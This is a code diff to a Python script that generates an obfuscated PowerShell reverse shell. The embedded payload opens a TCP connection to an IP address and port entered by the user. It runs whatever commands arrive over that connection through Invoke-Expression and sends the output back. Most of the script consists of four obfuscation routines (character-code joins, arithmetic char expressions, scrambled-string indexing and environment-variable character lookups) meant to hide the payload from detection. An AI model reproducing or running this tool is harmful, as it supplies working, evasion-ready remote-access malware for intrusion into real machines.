@@ -4,9 +4,9 @@ import string
 import os
 
 # PAYLOAD AND PATTERN
-reverse_shell = """$ReverseShellConnection = (& (/New-Object/) (/System.Net.Sockets.TCPClient/)(((IP_ADDRESS), (PORT))));$NetworkStream = $ReverseShellConnection.(/GetStream/)();$ReadBuffer = (& (/New-Object/) Byte[] 65536);while (($BytesRead = $NetworkStream.(/Read/)($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {;$CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead);$ExecutedOutput = (& (/Invoke-Expression/) $CommandOutput 2>&1) | & (/Out-String/);$PromptWithOutput = $ExecutedOutput + 'PS >';$OutputBytes = ([text.encoding]::ASCII.(/GetBytes/)($PromptWithOutput));$NetworkStream.(/Write/)($OutputBytes, 0, $OutputBytes.(/Length/));$NetworkStream.(/Flush/)();}$ReverseShellConnection.(/Close/)()"""
+reverse_shell = """$ReverseShellConnection = (& (\New-Object\) (\System.Net.Sockets.TCPClient\)(((\IP_ADDRESS\), (\PORT\))));$NetworkStream = $ReverseShellConnection.(\GetStream\)();$ReadBuffer = (& (\New-Object\) Byte[] 65536);while (($BytesRead = $NetworkStream.(\Read\)($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {;$CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead);$ExecutedOutput = (& (\Invoke-Expression\) $CommandOutput 2>&1) | & (\Out-String\);$PromptWithOutput = $ExecutedOutput + 'PS >';$OutputBytes = ([text.encoding]::ASCII.(\GetBytes\)($PromptWithOutput));$NetworkStream.(\Write\)($OutputBytes, 0, $OutputBytes.(\Length\));$NetworkStream.(\Flush\)();}$ReverseShellConnection.(\Close\)()"""
 
-pattern = r"/.+?/"
+pattern = r"\\.+\\"
 
 # REPLACE IP/PORT
 ip_address = input("Enter IP: ")
@@ -34,6 +34,7 @@ def list_2_character_2_string(object):
         command = object
     else:
         command = object.group(0)[1:-1]
+	    
     return r"([string]::join('', ( (" + ','.join(str(ord(character)) for character in command) +  r") |%{$_}|%{ ([char][int] $_)})) |%{$_}| % {$_})"
 	
 # METHOD 2
@@ -54,6 +55,7 @@ def character_2_string(object):
         else:
             part = f"([char]({rnd}{operation}{str(ord(character))}{compliment}{rnd})" + r" |%{$_})"
         parts.append(part)
+	    
     return '+'.join(parts)
 
 # METHOD 3
@@ -63,18 +65,18 @@ def random_string_2_string(object):
     else:
         command = object.group(0)[1:-1]
 	    
-    char_positions = [''] * 150
+    char_positions = [''] * 170
     indices_used = []
     
     for character in command:
-        index = random.choice([i for i in range(150) if char_positions[i] == ''])
+        index = random.choice([i for i in range(170) if char_positions[i] == ''])
         char_positions[index] = character
         indices_used.append(index)
         
     for i in range(len(char_positions)):
         if char_positions[i] == '':
             char_positions[i] = random.choice(string.ascii_letters + string.digits)
-            
+		
     return "'" + ''.join(char_positions) + "'[" + ','.join(map(str, indices_used)) + "] -join '' |%{$_}| % {$_}"
 
 # METHOD 4
@@ -94,28 +96,28 @@ env = [
 
 environment_variable_character_map = {}
 
-for c in string.printable:
-    envMap[c] = {}
-    for v in env:
-        val = os.getenv(v)
-        if c in val:
-            envMap[c][v] = []
-            for i,t in enumerate(val):
-                if c == t:
-                    envMap[c][v].append(i)
+for character in string.printable:
+    environment_variable_character_map[character] = {}
+    for variable in env:
+        value = os.getenv(variable)
+        if character in value:
+            environment_variable_character_map[character][variable] = []
+            for index, character_in_value in enumerate(value):
+                if character == character_in_value:
+                    environment_variable_character_map[character][variable].append(index)
                     
 def environment_variables_2_string(object):
-    if isinstance(match, str):
-        command = match
+    if isinstance(object, str):
+        command = object
     else:
-        command = match.group(0)[1:-1]
+        command = object.group(0)[1:-1]
 	    
     hidden_strings = []
     for character in command:
         if character in environment_variable_character_map and environment_variable_character_map[character]:
             possible_variables = list(environment_variable_character_map[character].keys())
             chosen_variable = random.choice(possible_variables)
-            possible_index = envMap[character]chosen_variable]
+            possible_index = environment_variable_character_map[character][chosen_variable]
             chosen_index = random.choice(possible_index)
             hidden_strings.append(f"$env:{chosen_variable}[{chosen_index}]")
         else:
@@ -126,6 +128,7 @@ def environment_variables_2_string(object):
 
 # REPLACE EACH MATCH WITH RANDOM METHOD
 for match in range(int(reverse_shell.count("/")/2)):
+    print(reverse_shell + "\n")
     reverse_shell = re.sub(pattern,
                            lambda m: random.choice([list_2_character_2_string,
                                                     character_2_string,
